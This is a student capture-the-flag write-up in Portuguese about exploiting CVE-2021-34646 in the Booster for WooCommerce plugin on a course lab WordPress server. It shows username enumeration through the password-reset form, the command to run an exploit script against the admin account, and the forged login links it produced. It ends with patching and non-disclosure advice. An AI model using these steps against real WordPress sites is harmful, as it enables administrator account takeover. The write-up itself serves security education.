# Semana 3

## CTF - Wordpress CVE

### Parte 1

Acedemos à página **http://ctf-fsi.fe.up.pt:5001**, que é um servidor WordPress. De seguida procuramos pelo site informações sobre as suas dependências, acabando por descobrir 3:

- Wordpress 5.8.1
- Woocommerce plugin 5.7.1
- Booster for WooCommerce plugin 5.4.3

De seguida, procuramos informações sobre os CVEs associados a cada plugin (versão correspondente). Acabamos por nos aperceber que o CVE-2021-34646 seria o mais adequado, pois permitia fazer login como outro utilizador. 

A resposta à primeira parte do CTF é então a seguinte: 

````
flag{CVE-2021-34646}
````

### Parte 2

Ao descobrir a vulnerabilidade do site, foi possível obter um script em Python para atacar o site. No entanto, para utilizar o script era necessário primeiramente fazer um pedido de reset de password. 

Como é possível descobrir se um username existe ou não quando se realiza um pedido de reset de password, testamos o username "admin". Verificando-se que este existe, realizamos o pedido de reset.
Como normalmente o id do admin é igual a 1, o próximo passo foi correr o script em python da seguinte maneira.

````
$ python3 script.py http://ctf-fsi.fe.up.pt:5001 1
````
Que nos deu estes resultados

````
#0 link for hash 1dc5a859697e220af9decfc1e158ebec:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiMWRjNWE4NTk2OTdlMjIwYWY5ZGVjZmMxZTE1OGViZWMifQ

#1 link for hash e14231468781c7aad7137a611652e35a:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiZTE0MjMxNDY4NzgxYzdhYWQ3MTM3YTYxMTY1MmUzNWEifQ

#2 link for hash 185893239b043ef2bcd6cf01b6007db4:
http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiMTg1ODkzMjM5YjA0M2VmMmJjZDZjZjAxYjYwMDdkYjQifQ

````

O que o script faz é formar um link de validação de login com o token codificado através da hora atual.

Ao aceder a um destes links, temos então acesso à conta de administrador do site. 
De seguida seguimos o guião e encontramos a flag num post privado. 

````
flag{please don't bother me}
````


### Vulnerabilidades

Após a resolução deste CTF, foi possível concluir que tipo de melhorias seria necessário fazer para melhorar a segurança do site.

1. Manter sempre as versões das dependências atualizadas ou em versões estáveis(sem vulnerabilidades conhecidas)

2. Aquando o pedido de mudança de passe, não revelar a existência ou não existência de username/e-mail.Dizer apenas "foi enviado e-mail caso o e-mail/username exista".

